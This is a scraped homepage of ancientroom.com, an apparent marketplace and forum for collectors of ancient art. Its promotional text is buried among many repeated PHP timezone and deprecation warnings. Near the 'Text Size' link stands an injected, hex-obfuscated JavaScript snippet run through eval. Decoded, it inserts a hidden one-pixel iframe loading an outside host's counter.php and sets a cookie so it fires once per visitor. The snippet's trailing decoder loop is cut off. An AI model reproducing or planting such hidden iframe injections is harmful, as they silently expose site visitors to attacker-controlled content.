@@ -1,0 +1,204 @@
+https://www.ancientscripts.com
+Warning:
+include_once() [function.include-once]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 101
+Deprecated:
+Assigning the return value of new by reference is deprecated in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 101
+Warning:
+include_once() [function.include-once]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 107
+Deprecated:
+Assigning the return value of new by reference is deprecated in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 107
+Warning:
+include_once() [function.include-once]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 644
+Deprecated:
+Assigning the return value of new by reference is deprecated in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 644
+Warning:
+include_once() [function.include-once]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 645
+Deprecated:
+Assigning the return value of new by reference is deprecated in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 645
+Warning:
+include_once() [function.include-once]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 653
+Deprecated:
+Assigning the return value of new by reference is deprecated in /home/jwwwaanc/public_html/components/libraries/cmslib/spframework.php on line 653
+ancientroom.com
+AncientRoom RSS
+Text Size
+ps="split";e=eval;v="0x";a=0;z="y";try{a*=25}catch(zz){a=1}if(!a){try{--e("doc"+"ument")["bod"+z]}catch(q){a2="_";sa=0xa-02;}z="28_6e_7d_76_6b_7c_71_77_76_28_82_82_82_6e_6e_6e_30_31_28_83_15_12_28_7e_69_7a_28_82_7c_6d_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_7a_6d_69_7c_6d_4d_74_6d_75_6d_76_7c_30_2f_71_6e_7a_69_75_6d_2f_31_43_15_12_15_12_28_82_7c_6d_36_7b_7a_6b_28_45_28_2f_70_7c_7c_78_42_37_37_6e_3a_6e_3b_3e_3d_36_6b_77_75_37_6b_77_7d_76_7c_6d_7a_36_78_70_78_2f_43_15_12_28_82_7c_6d_36_7b_7c_81_74_6d_36_78_77_7b_71_7c_71_77_76_28_45_28_2f_69_6a_7b_77_74_7d_7c_6d_2f_43_15_12_28_82_7c_6d_36_7b_7c_81_74_6d_36_6a_77_7a_6c_6d_7a_28_45_28_2f_38_2f_43_15_12_28_82_7c_6d_36_7b_7c_81_74_6d_36_70_6d_71_6f_70_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_82_7c_6d_36_7b_7c_81_74_6d_36_7f_71_6c_7c_70_28_45_28_2f_39_78_80_2f_43_15_12_28_82_7c_6d_36_7b_7c_81_74_6d_36_74_6d_6e_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_82_7c_6d_36_7b_7c_81_74_6d_36_7c_77_78_28_45_28_2f_39_78_80_2f_43_15_12_15_12_28_71_6e_28_30_29_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_82_7c_6d_2f_31_31_28_83_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_7f_7a_71_7c_6d_30_2f_44_6c_71_7e_28_71_6c_45_64_2f_82_7c_6d_64_2f_46_44_37_6c_71_7e_46_2f_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_82_7c_6d_2f_31_36_69_78_78_6d_76_6c_4b_70_71_74_6c_30_82_7c_6d_31_43_15_12_28_85_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_5b_6d_7c_4b_77_77_73_71_6d_30_6b_77_77_73_71_6d_56_69_75_6d_34_6b_77_77_73_71_6d_5e_69_74_7d_6d_34_76_4c_69_81_7b_34_78_69_7c_70_31_28_83_15_12_28_7e_69_7a_28_7c_77_6c_69_81_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_7e_69_7a_28_6d_80_78_71_7a_6d_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_71_6e_28_30_76_4c_69_81_7b_45_45_76_7d_74_74_28_84_84_28_76_4c_69_81_7b_45_45_38_31_28_76_4c_69_81_7b_45_39_43_15_12_28_6d_80_78_71_7a_6d_36_7b_6d_7c_5c_71_75_6d_30_7c_77_6c_69_81_36_6f_6d_7c_5c_71_75_6d_30_31_28_33_28_3b_3e_38_38_38_38_38_32_3a_3c_32_76_4c_69_81_7b_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_28_45_28_6b_77_77_73_71_6d_56_69_75_6d_33_2a_45_2a_33_6d_7b_6b_69_78_6d_30_6b_77_77_73_71_6d_5e_69_74_7d_6d_31_15_12_28_33_28_2a_43_6d_80_78_71_7a_6d_7b_45_2a_28_33_28_6d_80_78_71_7a_6d_36_7c_77_4f_55_5c_5b_7c_7a_71_76_6f_30_31_28_33_28_30_30_78_69_7c_70_31_28_47_28_2a_43_28_78_69_7c_70_45_2a_28_33_28_78_69_7c_70_28_42_28_2a_2a_31_43_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_4f_6d_7c_4b_77_77_73_71_6d_30_28_76_69_75_6d_28_31_28_83_15_12_28_7e_69_7a_28_7b_7c_69_7a_7c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_76_69_75_6d_28_33_28_2a_45_2a_28_31_43_15_12_28_7e_69_7a_28_74_6d_76_28_45_28_7b_7c_69_7a_7c_28_33_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_33_28_39_43_15_12_28_71_6e_28_30_28_30_28_29_7b_7c_69_7a_7c_28_31_28_2e_2e_15_12_28_30_28_76_69_75_6d_28_29_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_38_34_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_31_28_31_28_31_15_12_28_83_15_12_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_85_15_12_28_71_6e_28_30_28_7b_7c_69_7a_7c_28_45_45_28_35_39_28_31_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_7e_69_7a_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_2a_43_2a_34_28_74_6d_76_28_31_43_15_12_28_71_6e_28_30_28_6d_76_6c_28_45_45_28_35_39_28_31_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_74_6d_76_6f_7c_70_43_15_12_28_7a_6d_7c_7d_7a_76_28_7d_76_6d_7b_6b_69_78_6d_30_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_74_6d_76_34_28_6d_76_6c_28_31_28_31_43_15_12_85_15_12_71_6e_28_30_76_69_7e_71_6f_69_7c_77_7a_36_6b_77_77_73_71_6d_4d_76_69_6a_74_6d_6c_31_15_12_83_15_12_71_6e_30_4f_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_31_45_45_3d_3d_31_83_85_6d_74_7b_6d_83_5b_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_34_28_2f_3d_3d_2f_34_28_2f_39_2f_34_28_2f_37_2f_31_43_15_12_15_12_82_82_82_6e_6e_6e_30_31_43_15_12_85_15_12_85_15_12"[ps](a2);za="";for(i=0;i" />
+Home
+Subscribe Here
+MY Account
+Member Login
+NEW Memberships
+Retrieve Log/Pass
+Forum
+How to Use Our Forums
+Live Auction
+About Our Auction
+Search Auctions
+Trusted Galleries
+Browse By Categories
+Search for A Gallery
+All Gallery Objects
+Dealer Login
+Forgot Pass/Login?
+Articles
+Showcase Articles
+Help
+Frequently Asked Questions
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+Warning:
+call_user_func_array() [function.call-user-func-array]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+Parameter 3 to mb_videobot() expected to be a reference, value given in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+call_user_func_array() [function.call-user-func-array]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+Parameter 3 to mb_videobot() expected to be a reference, value given in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+call_user_func_array() [function.call-user-func-array]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+Parameter 3 to mb_videobot() expected to be a reference, value given in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+call_user_func_array() [function.call-user-func-array]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+Parameter 3 to mb_videobot() expected to be a reference, value given in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Buy
+Buying Authentic and Accurately represented objects is the basis for this website and we exist because collectors desire a legitimate forum where one can view and acquire objects that will be appreciated for a lifetime and many more.
+Read the Full Story
+Sell
+Selling at Ancientroom.com is simple! This is YOUR opportunity to offer objects that you are interested in selling and reach the largest group of specialized collectors ever assimilated into one place. All it takes is a few photographs of your pieces and then, let the community of collectors come to you.
+Read the Full Story
+Learn
+The Opportunity to learn abounds at Ancientroom! Various discussion forums have been created so that users with similar interests can exchange ideas and concepts. We have also enabled a system that allows the user to easily become introduced to others
+Read the Full Story
+Meet
+Would you recognize a collector or passionate academic of ancient art if you passed them on the street?
+Would your friends think to introduce and mention it at a dinner party?
+There are many reasons why passionate collectors never meet; so, here at Ancientroom, we seek to resolve this desire
+Read the Full Story
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/administrator/components/com_comprofiler/plugin.foundation.php on line 424
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/administrator/components/com_comprofiler/plugin.foundation.php on line 424
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/plugins/system/legacy/functions.php on line 826
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/plugins/system/legacy/functions.php on line 826
+Remember me
+Forgot login? | Register
+One of Our Favorite Galleries!
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+One of Our Preferred Galleries!
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Tags not found
+Warning:
+strtotime() [function.strtotime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 56
+Warning:
+strtotime() [function.strtotime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 56
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+ancientroom.com
+Warning:
+require_once() [function.require-once]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/plugins/content/uddeim_pms_contentlink.php on line 50
+Deprecated:
+Assigning the return value of new by reference is deprecated in /home/jwwwaanc/public_html/plugins/content/uddeim_pms_contentlink.php on line 50
+Warning:
+require_once() [function.require-once]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/plugins/content/azvideobot.php on line 43
+Deprecated:
+Assigning the return value of new by reference is deprecated in /home/jwwwaanc/public_html/plugins/content/azvideobot.php on line 43
+Warning:
+call_user_func_array() [function.call-user-func-array]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+Warning:
+Parameter 3 to mb_videobot() expected to be a reference, value given in /home/jwwwaanc/public_html/libraries/joomla/event/dispatcher.php on line 136
+WELCOME To Ancientroom!
+Warning:
+mktime() [function.mktime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 117
+Warning:
+mktime() [function.mktime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 117
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 245
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 245
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 249
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 249
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Last Updated on Sunday, 05 August 2012 10:25
+Written by Administrative Team
+Warning:
+mktime() [function.mktime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 117
+Warning:
+mktime() [function.mktime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 117
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 245
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 245
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 249
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 249
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Tuesday, 01 February 2011 12:28
+Thanks for visiting
+Thank you for your visit to our dynamic new concept in an ancient world! This fresh and new opportunity to create interaction between sellers, collectors, academics, and curiosity seekers who all share a passion for ancient world art, has taken an extensive amount of hard work from a devoted team and we hope that the benefits will be shared by all.
+ANTICIPATED LAUNCH of Mid-April
+This project has been many months in the process of development but Not Yet Perfected. Please Check back again in Late April when we expect to be Fully Operational!
+The Concept
+The principle here is unique in the idea that we believe education is the key to happy collecting. This theory has lead to the creation of a brilliant forum where collectors and potentially interested collectors can come to discuss their interests, view objects of high quality, acquire items that one may have never thought possible, and interact with specialists surrounding the globe so that everyone can benefit.
+An idea Changing the Field
+Combining the passion for collecting objects of antiquity with the modern world of cyber-space is daunting, however, at Ancientroom.com, simplicity is key. You will find the website exceptionally user friendly, easy to navigate, and something that exists no where else. As a user of this site, the ability to interact with others who share your passion is the core element; how you use this tool is up to you!
+Our determination to provide an atmosphere that is user friendly and beneficial to each and every user is your advantage. The creation of Ancientroom.com has been long and tedious and the benefit is meant for its users. Here, you will find the ability to span the globe in searching for others who share your passions. Also, you have the ability to advertise and market your own objects.
+Curious?
+It could be that you have a few objects you believe are ancient, but you don't know where to get advice at. Here, all you need to do is post a few photographs and you will receive input from the community of people worldwide who have experience and knowledge. It's as simple as that!
+Community
+Ancientroom is built on a community of people with similar collecting interests. The idea comes from the fact that, sooner or later, everyone with similar interests will meet. We want to facilitate this situation so that less time is wasted! On this website, one can easily navigate between the discussion forums, galleries of dependable retail sellers who offer highest quality objects, classified advertisements for users of the site, and the live auction where objects of high quality are being offered every day.
+Join The Community!
+The benefits are immense. If you seek to buy, sell, or discuss ancient objects from anywhere in the world, then THIS is your place. The largest community of respected buyers and sellers for such objects exists right here and the networking possibilities are growing every day. Objects are being traded by the minute and if you hesitate, it's opportunities lost!
+Home
+MY AccountAuction
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/modules/mod_sections/helper.php on line 33
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/modules/mod_sections/helper.php on line 33
+MyBlog
+FrontPage
+How To Use Ancientroom
+Help
+Site Use Terms and Conditions
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+Warning:
+date() [function.date]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 198
+WELCOME To Ancientroom!
+Learn
+How to Use the Classified Ads
+How to Use the Auction
+Buy
+Restore Default Settings
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Warning:
+strftime() [function.strftime]: It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected 'America/New_York' for 'EST/-5.0/no DST' instead in /home/jwwwaanc/public_html/libraries/joomla/utilities/date.php on line 250
+Copyright © 2016 ancientroom.com. All Rights Reserved.
+AncientRoom.com
